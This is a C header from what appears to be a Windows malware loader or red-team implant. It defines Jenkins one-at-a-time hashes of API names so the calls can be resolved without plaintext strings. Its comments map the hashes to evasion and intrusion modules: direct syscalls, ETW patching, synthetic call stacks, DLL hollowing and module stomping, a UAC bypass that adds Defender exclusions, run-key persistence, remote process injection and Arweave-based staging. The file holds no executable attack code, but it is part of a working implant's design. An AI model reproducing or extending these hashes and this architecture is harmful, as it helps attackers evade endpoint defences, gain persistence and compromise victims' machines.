#pragma once

// =============================================
// Hashes.h — JOAAT 32-bit name hashes for syscalls
// and dynamically-resolved Win32 APIs.
//
// Computed from API names via HashStringJenkinsOneAtATime32BitA.
// Used by FetchExportAddress / FetchNtSyscall to resolve exports
// without storing plaintext API names in the binary.
//
// When adding a new dynamically-resolved API:
//   1. Run Encrypt.py's hash helper (or compute by hand) to get
//      the 32-bit hash for the API name
//   2. Add a `<Name>_JOAAT` #define below
//   3. Reference it from C code via FetchExportAddress(module, <Name>_JOAAT)
//
// Hash values are stable across builds — they only depend on the
// API name string, not on Encrypt.py's per-run randomness.
// =============================================

// ----------- Syscall Name Hashes (Jenkins One-at-a-Time 32-bit) -----------
#define NtAllocateVirtualMemory_JOAAT   0xE33A06BF
#define NtProtectVirtualMemory_JOAAT    0x82BB0EE0
#define NtWaitForSingleObject_JOAAT     0xE2C26E26
#define NtCreateSection_JOAAT           0x9A538B2B
#define NtMapViewOfSection_JOAAT        0xD3B060A1
// Used only for bootstrap — clean-ntdll section mapping
#define NtOpenSection_JOAAT             0x6EC52BCD

// ----------- Exit Hook / Elevation (ntdll exports) -----------
#define RtlExitUserProcess_JOAAT        0x3DC05538
#define LdrAddRefDll_JOAAT              0x807ED758
#define NtOpenProcessToken_JOAAT        0xD5D4A26D
#define NtQueryInformationToken_JOAAT   0x28CEAE31
#define NtClose_JOAAT                   0xB1D7C572
#define NtTerminateProcess_JOAAT        0x9C12CA95

// ----------- Unwind-info registration for stomped modules -----------
#define RtlAddFunctionTable_JOAAT       0xF1F158AB

// ----------- Synthetic call-stack frames (Draugr MVP) -----------
// (NtWaitForSingleObject_JOAAT is already defined above — reused here as
// one of the three anchor RIPs for the fake stack.)
#define RtlUserThreadStart_JOAAT        0xF7972684
#define BaseThreadInitThunk_JOAAT       0x50635B44

// ----------- Elevation (kernel32 exports) -----------
#define GetModuleFileNameA_JOAAT        0x665A0D0F

// ----------- Phantom DLL Hollowing Hashes (kernel32 exports) -----------
#define ReadFile_JOAAT                  0x62BF1D54
#define WriteFile_JOAAT                 0x8CFB9E0E
#define SetFilePointer_JOAAT            0xCF8699F2
#define CloseHandle_JOAAT               0x8FA1D581

// ----------- Thread Pool Hashes (ntdll exports, resolved via FetchExportAddress) -----------
#define TpAllocWork_JOAAT               0xE6CACAE7
#define TpPostWork_JOAAT                0xBEF96313
#define TpReleaseWork_JOAAT             0xBA0F3087

// ----------- Sleep (used for retry delays in Arweave.c / Staging.c) -----------
#define Sleep_JOAAT                     0x8EC35C06  // kernel32!Sleep

// ----------- WinAPI Name Hashes -----------
#define LoadLibraryA_JOAAT              0xEC33D795
#define GetProcAddress_JOAAT            0x8F900864
#define GetModuleHandleA_JOAAT          0x9D783EFE
#define VirtualProtect_JOAAT            0x69B260D2
#define EtwEventWrite_JOAAT             0xEF9B6F9B

// ----------- Bind File Discovery (kernel32 exports) -----------
#define FindFirstFileA_JOAAT            0xBEB8D600
#define FindNextFileA_JOAAT             0x5D8A9C6B
#define FindClose_JOAAT                 0x1FF88458
#define GetCommandLineA_JOAAT           0x14D7236E  // persistence-launch guard in Sideload.c

// ----------- UacBypass.c — AppInfo RPC WD exclusion (kernel32) -----------
#define CreateEventW_JOAAT              0xC56DE59D
#define WaitForSingleObject_JOAAT       0x000DEA0A
#define WaitForDebugEvent_JOAAT         0x529F4D40
#define ContinueDebugEvent_JOAAT        0x64D063F8
#define DebugActiveProcessStop_JOAAT    0xA238C74D
#define TerminateProcess_JOAAT          0x66AFA02A
#define GetSystemDirectoryW_JOAAT       0xD3A9E702
#define GetWindowsDirectoryW_JOAAT      0xB8923C5F
#define GetModuleFileNameW_JOAAT        0x6EEA1E33
#define CreateProcessW_JOAAT            0xD460721B
#define InitializeProcThreadAttributeList_JOAAT  0x8F01862A
#define UpdateProcThreadAttribute_JOAAT          0x0C6CB2A1
#define DeleteProcThreadAttributeList_JOAAT      0x30A136E9

// ----------- UacBypass.c — AppInfo RPC WD exclusion (ntdll) -----------
#define NtQueryInformationProcess_JOAAT 0xE873107E
#define NtRemoveProcessDebug_JOAAT      0x38CC29DE
#define NtDuplicateObject_JOAAT         0x86426FE8
#define DbgUiSetThreadDebugObject_JOAAT 0xCF6EB6F6

// ----------- Persist.c — Registry run-key persistence (advapi32) -----------
#define RegOpenKeyExW_JOAAT             0x769D1396
#define RegSetValueExW_JOAAT            0x941AFF2B
#define RegCloseKey_JOAAT               0xFADC2D7D

// ----------- Inject.c — Remote process injection (BUILD_DLL persistence path) -----------
#define NtOpenProcess_JOAAT             0x61CF38BC
#define NtWriteVirtualMemory_JOAAT      0x7A65C193
#define NtCreateThreadEx_JOAAT          0xE5F15DAA
#define NtQuerySystemInformation_JOAAT  0x62A8E2DE
